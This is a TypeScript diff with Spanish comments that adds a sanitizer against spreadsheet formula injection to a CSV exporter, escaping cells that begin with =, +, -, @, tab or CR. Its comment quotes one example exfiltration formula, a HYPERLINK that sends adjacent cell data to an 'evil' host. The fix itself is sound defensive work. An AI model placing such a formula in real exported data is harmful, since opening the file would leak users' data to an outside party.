@@ -328,10 +328,26 @@ interface RelationLabeler {
     labels(fieldId: number, value: unknown): string;
 }
 
+/**
+ * SEC-25 (v0.1.226) — inyección de fórmulas en planillas. Una celda que empieza
+ * con `=`, `+`, `-`, `@`, TAB o CR la ejecuta Excel/Sheets al abrir el archivo
+ * (`=HYPERLINK("https://evil/?d="&A2,"Ver")` manda los datos vecinos afuera).
+ * Esos valores llegan de afuera: el portal, el webhook entrante, la tienda.
+ * Se neutralizan con un apóstrofo delante; un número o un teléfono (`-5`,
+ * `+57 300 111 2233`) no son fórmula y quedan intactos — el import los
+ * vuelve a leer igual.
+ */
+export function neutralizeFormula(cell: string): string {
+    if (!/^[=+\-@\t\r]/.test(cell)) return cell;
+    if (/^[+-][\d\s().,-]*$/.test(cell)) return cell;
+    return `'${cell}`;
+}
+
 /** Una línea CSV con quoting RFC-4180 (comillas dobladas, quote si hace falta). */
 function csvLine(cells: string[], delimiter: string): string {
     return (
         cells
+            .map(neutralizeFormula)
             .map((cell) => {
                 if (
                     cell.includes(delimiter)
